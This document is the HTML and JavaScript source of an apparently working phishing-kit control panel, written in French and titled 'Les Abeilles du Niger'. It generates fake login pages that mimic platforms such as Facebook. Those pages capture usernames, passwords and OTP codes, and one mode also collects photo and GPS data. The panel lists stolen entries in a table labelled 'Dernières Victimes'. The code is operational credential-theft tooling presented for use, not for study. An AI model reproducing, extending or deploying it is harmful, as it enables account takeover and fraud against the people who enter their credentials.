<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Panel Admin - Abeilles du Niger</title>
    <style>
        * { box-sizing: border-box; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
        body { background-color: #0d1117; color: #c9d1d9; margin: 0; padding: 20px; }
        .container { max-width: 1000px; margin: auto; }
        .header { display: flex; justify-content: space-between; align-items: center; border-bottom: 2px solid #d4af37; padding-bottom: 15px; margin-bottom: 20px; }
        .header h1 { color: #d4af37; margin: 0; font-size: 24px; }
        .grid { display: grid; grid-template-columns: 1fr 1fr; gap: 20px; }
        .card { background: #161b22; border: 1px solid #30363d; border-radius: 8px; padding: 20px; }
        .card h2 { color: #d4af37; font-size: 18px; margin-top: 0; }
        .form-group { margin-bottom: 15px; }
        label { display: block; margin-bottom: 5px; font-size: 14px; color: #8b949e; }
        input, select, textarea { width: 100%; padding: 10px; border-radius: 6px; border: 1px solid #30363d; background: #0d1117; color: #c9d1d9; }
        textarea { height: 100px; resize: vertical; }
        button { width: 100%; padding: 12px; background: #d4af37; color: #000; border: none; border-radius: 6px; font-weight: bold; cursor: pointer; font-size: 16px; transition: 0.2s; }
        button:hover { background: #e5c354; }
        .result-box { display: none; margin-top: 15px; padding: 15px; background: #0d1117; border: 1px solid #d4af37; border-radius: 6px; word-break: break-all; }
        .result-box a { color: #58a6ff; font-weight: bold; text-decoration: none; font-size: 16px; }
        table { width: 100%; border-collapse: collapse; margin-top: 20px; font-size: 13px; }
        th, td { padding: 10px; text-align: left; border-bottom: 1px solid #30363d; }
        th { background: #0d1117; color: #d4af37; }
        tr:hover { background: #1f2428; }
    </style>
</head>
<body>
<div class="container">
    <div class="header">
        <h1>🐝 Les Abeilles du Niger - Panel</h1>
    </div>

    <div class="grid">
        <div class="card">
            <h2>🔗 Créer un Lien</h2>
            <div class="form-group">
                <label>Nom du lien (Slug)</label>
                <input type="text" id="slug" placeholder="ex: facebook-promo">
            </div>
            <div class="form-group">
                <label>Mode de création</label>
                <select id="mode" onchange="toggleMode()">
                    <option value="opt1">Option 1 : No-Code (Auto)</option>
                    <option value="opt2">Option 2 : Code HTML (Standard)</option>
                    <option value="opt3">Option 3 : Code HTML + Photo/GPS</option>
                </select>
            </div>
            <div class="form-group">
                <label>Réseau / Plateforme</label>
                <input type="text" id="network" value="Facebook">
            </div>
            <div class="form-group">
                <label>Lien de Redirection Finale</label>
                <input type="text" id="redirectUrl" value="https://www.facebook.com">
            </div>

            <!-- Option 1 -->
            <div id="opt1-fields">
                <div class="form-group">
                    <label>Titre de la page</label>
                    <input type="text" id="title" value="Connexion Sécurisée">
                </div>
                <div class="form-group">
                    <label>Nombre de champs</label>
                    <select id="fieldCount">
                        <option value="2">2 Champs (Identifiant + Mdp)</option>
                        <option value="3">3 Champs (Identifiant + Mdp + OTP)</option>
                    </select>
                </div>
            </div>

            <!-- Option 2 & 3 -->
            <div id="opt2-fields" style="display:none;">
                <div class="form-group">
                    <label>Colle ton code HTML ici (SANS la balise script)</label>
                    <textarea id="htmlCode" placeholder="<html>...ton code...</html>"></textarea>
                </div>
            </div>

            <button onclick="creerLien()">Générer le Lien</button>

            <div class="result-box" id="resultBox">
                <p>✅ Lien généré :</p>
                <a id="finalLink" href="#" target="_blank"></a>
            </div>
        </div>

        <div class="card">
            <h2>🎯 Dernières Victimes</h2>
            <button onclick="loadVictims()" style="margin-bottom: 10px; background: #30363d; color: #fff;">Actualiser</button>
            <table id="victimsTable">
                <thead><tr><th>Réseau</th><th>User</th><th>Pass</th><th>OTP</th><th>Date</th></tr></thead>
                <tbody></tbody>
            </table>
        </div>
    </div>
</div>

<script>
    const OWNER = "Admin";
    
    function toggleMode() {
        const mode = document.getElementById('mode').value;
        document.getElementById('opt1-fields').style.display = mode === 'opt1' ? 'block' : 'none';
        document.getElementById('opt2-fields').style.display = mode === 'opt2' || mode === 'opt3' ? 'block' : 'none';
    }

    function creerLien() {
        const mode = document.getElementById('mode').value;
        let fields = [];
        
        if (mode === 'opt1') {
            const count = document.getElementById('fieldCount').value;
            fields = [{ name: "user", type: "text", label: "Email" }, { name: "pass", type: "password", label: "Mot de passe" }];
            if (count == "3") fields.push({ name: "otp", type: "text", label: "Code OTP" });
        }

        const payload = {
            owner: OWNER,
            slug: document.getElementById('slug').value,
            mode: mode,
            network: document.getElementById('network').value,
            redirectUrl: document.getElementById('redirectUrl').value,
            title: document.getElementById('title') ? document.getElementById('title').value : "Connexion",
            bgType: "color", bgValue: "#0d1b2a", boxBg: "#ffffff", boxWidth: "420px", btnText: "Se connecter",
            htmlCode: document.getElementById('htmlCode') ? document.getElementById('htmlCode').value : "",
            fields: fields
        };

        if (!payload.slug) return alert("Entre un nom de lien.");

        fetch('/api/create_login', {
            method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(payload)
        }).then(res => res.json()).then(data => {
            if (data.status === 'success') {
                document.getElementById('resultBox').style.display = 'block';
                document.getElementById('finalLink').href = data.url;
                document.getElementById('finalLink').textContent = data.url;
            } else alert("Erreur: " + data.message);
        });
    }

    function loadVictims() {
        fetch('/api/victims').then(res => res.json()).then(data => {
            const tbody = document.querySelector('#victimsTable tbody');
            tbody.innerHTML = '';
            data.forEach(v => {
                tbody.innerHTML += `<tr><td>${v.network}</td><td>${v.victimUser}</td><td>${v.victimPass}</td><td>${v.otp}</td><td>${v.dateStr}</td></tr>`;
            });
        });
    }

    // Charger au démarrage
    loadVictims();
</script>
</body>
</html>
